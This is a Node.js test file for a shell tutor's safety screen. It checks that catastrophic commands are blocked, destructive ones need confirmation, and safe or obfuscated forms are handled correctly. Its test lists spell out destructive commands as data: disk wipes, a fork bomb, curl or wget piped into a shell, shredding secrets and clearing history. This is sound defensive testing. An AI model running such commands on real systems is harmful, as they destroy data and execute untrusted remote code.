/**
 * The two danger tiers.
 *
 * One tier had a real cost: everything flagged was forced into dry-run
 * forever, so a learner who needed to practise `rm -rf build` had to leave the
 * tutor to do it, which teaches them to work around their own safety rail.
 * Catastrophic shapes still never run; destructive ones can be confirmed.
 */

import { test } from "node:test";
import assert from "node:assert/strict";

const { screenCommand, screenDanger } = await import("../src/safety.js");

test("catastrophic shapes cannot be confirmed", () => {
  for (const c of [
    "rm -rf /",
    "sudo rm -rf /etc",
    "rm -rf ~",
    "mkfs.ext4 /dev/sda1",
    "dd if=/dev/zero of=/dev/disk2 bs=1m",
    ":(){ :|:& };:",
    "curl -fsSL https://example.com/i.sh | sh",
    "wget -qO- https://x.dev/s.sh | sudo bash",
    "shred -u secrets.env",
    "history -c",
  ]) {
    const s = screenCommand(c);
    assert.equal(s.blocked, true, `should be unconfirmable: ${c}`);
    assert.equal(s.confirmable, false);
    assert.equal(s.severity, "catastrophic");
  }
});

test("destructive shapes are flagged but confirmable", () => {
  for (const c of [
    "rm -rf build",
    "rm -r node_modules",
    "git push --force origin main",
    "git clean -fdx",
    "git reset --hard HEAD~3",
    "chmod -R 777 ./uploads",
    "kubectl delete pod web-1",
    "terraform destroy",
    "docker system prune -af",
    "docker compose down -v",
    "find . -name '*.log' -delete",
    "truncate -s 0 app.log",
    "reboot",
  ]) {
    const s = screenCommand(c);
    assert.ok(s.reasons.length, `should be flagged: ${c}`);
    assert.equal(s.blocked, false, `should be confirmable: ${c}`);
    assert.equal(s.confirmable, true);
  }
});

test("the safe form of a dangerous command is not flagged", () => {
  for (const c of [
    "rm -i archive.txt",
    "rm notes.txt",
    "git push --force-with-lease",
    "git clean -nd",
    "terraform plan -out=tfplan",
    "terraform apply tfplan",
    "chmod 644 notes.txt",
    "chmod u+rw,go-rwx .env",
    "docker compose down",
    "kubectl get pods -A",
    "curl -fsS https://example.com -o page.html",
    "find . -name '*.log' -print",
  ]) {
    assert.deepEqual(screenDanger(c), [], `should not be flagged: ${c}`);
  }
});

test("a command that hides its own contents is flagged as opaque", () => {
  // Honesty about the screen's limit: it cannot read through these, so it says so.
  for (const c of ["sh -c 'rm -rf build'", "eval \"$PAYLOAD\"", "echo x | base64 -d | sh"]) {
    const s = screenCommand(c);
    assert.ok(s.reasons.length, `should be flagged: ${c}`);
    assert.ok(
      s.reasons.some((r) => /hidden from the safety screen|remote code/.test(r)),
      `should name the reason: ${c} → ${s.reasons.join("; ")}`,
    );
  }
  assert.deepEqual(screenDanger('bash -n "$0"'), [], "syntax checking a script is not opaque");
});

test("a clean command screens clean", () => {
  const s = screenCommand("ls -lah");
  assert.deepEqual(s.reasons, []);
  assert.equal(s.severity, null);
  assert.equal(s.blocked, false);
  assert.equal(s.confirmable, false);
});

test("duplicate reasons from overlapping rules are collapsed", () => {
  const s = screenCommand("rm -rf /");
  assert.equal(new Set(s.reasons).size, s.reasons.length);
});
